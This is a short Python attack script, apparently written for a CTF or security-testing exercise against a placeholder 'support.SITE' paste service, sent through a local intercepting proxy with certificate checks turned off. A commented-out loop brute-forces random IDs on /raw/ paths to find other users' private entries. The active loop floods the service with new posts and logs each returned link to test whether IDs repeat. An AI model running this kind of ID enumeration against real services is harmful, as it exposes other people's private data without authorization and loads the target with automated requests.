import random
import string
import re
import urllib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {
    'https': 'http://127.0.0.1:8085',
    'http': 'http://127.0.0.1:8085'
}

# def generate():
#     return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(len("9ENseUC4wi7")))

# while True:
#     n = generate()
#     req = requests.get(f'https://support.SITE/raw/{n}', proxies=proxy, verify=False)
#     if (req.status_code != 404):
#         print(f"https://support.SITE/raw/{n}", flush=True)

d = []
while True:
  res = requests.post(f'https://support.SITE/new', proxies=proxy, verify=False, data=urllib.parse.urlencode(dict(title="a", content="a", fee="0")),
              headers={
    "Content-Type": "application/x-www-form-urlencoded"
}, allow_redirects=False
)
  link = res.headers["Location"]
  if (link in d):
    print("DUP", link, flush=True)
  d.append(link)
  print(link, flush=True)